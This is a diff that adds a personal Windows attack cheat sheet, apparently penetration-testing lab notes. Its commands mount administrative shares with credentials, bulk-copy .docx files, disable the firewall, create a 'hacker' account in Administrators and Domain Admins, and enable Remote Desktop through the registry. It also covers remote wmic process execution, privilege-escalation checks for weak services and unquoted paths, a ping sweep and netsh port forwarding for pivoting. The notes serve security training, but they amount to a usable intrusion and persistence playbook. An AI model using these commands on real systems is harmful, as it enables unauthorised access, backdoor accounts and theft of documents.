@@ -1,0 +1,130 @@
+WINDOWS
+Connect to shares
+
+This will attempt to connect to a share and see what is on it.
+
+net use K: \\<IP address\share IE C or Admin>  
+
+net use K: \\192.168.31.53\C  <--this will connect to the K drive
+
+net use K: \\192.168.31.53\C$ /user:george P@$$Word34 
+
+Find files
+
+dir c: /b /s .docx | findstr /e .docx
+for /R c: %f in (*.docx) do copy %f c:\temp\
+
+
+1.To Turn Off:
+2.NetSh Advfirewall set allprofiles state off
+3.To Turn On:
+4.NetSh Advfirewall set allrprofiles state on
+5.To check the status of Windows Firewall:
+6.Netsh Advfirewall show allprofiles
+
+net group "Domain Admins" uatoperator /add /domain
+
+net user /add hacker HELL0$ir11
+^^^ Add user to computer
+
+net localgroup Administrators hacker /add
+
+^^^^^ Add the user "hacker to admin group"
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+^^^^^enables Remote Desktop
+
+from windows, type -- **nbtstat -a
+
+if you then see something like    ELS-WINXP    <20>    Unique    Registered  -- then there is a server or share :)
+
+================
+
+from windows, type net view <IPaddress>   ** this should list the shares, domains, and resources on the target
+
+==================
+
+
+
+==================
+
+Do the following from a command prompt to see who you are
+
+echo %username%
+
+echo %userdomain%
+
+whoami
+
+====================
+
+sc query  ----- list all services :)
+
+*********************
+Once we have AccessChk downloaded on our target machine, GREED, we can run the following command to determine which Services can be modified by any authenticated user (regardless of privilege level):
+
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+
+***********************
+
+privesc.bat Everyone Users "Authenticated Users"  <---this is for the privilege escalation batch file :)
+
+
+-------------------
+
+ping sweep
+
+for /l %i in(1,1,254) do ping -n 1 -w 100 10.11.1.0%i
+
+
+==============================
+
+unquoted service paths
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+------------
+
+ wmic to get a full listing of the running processes:
+
+wmic process list full
+
+wmic print to a HTML formatted list of processes:
+
+wmic /output:wmic.html process list full /format:hform
+
+wmic query running services:
+
+sc query type= service
+
+wmic startup programs:
+
+wmic startup list brief
+
+wmic remote command execution:
+
+wmic /node:10.0.0.1 /user:Administrator process call create "cmd.exe /c calc.exe"
+
+Format WMIC Queries as html
+
+wmic process list full > output.html
+
+netsh IPv4 to IPv6 port conversion for a remote computer:
+
+netsh interface portproxy add v4tov6 listenport=8888 listenaddress=0.0.0.0 connectport=80 connectaddress=2000::1:215:5dff:fe01:247
+
+netsh IPv4 port to another IPv4 port on the same host:
+
+netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=445 connectaddress=192.168.1.112
+
+netsh ipconfig:
+
+netsh interface ipv4 show addresses
+
+Anywhere with IP reachability to target machine:
+
+netsh -r 192.168.1.103 -u entsim\administrator -p P@ssw0rd!
+
+
+
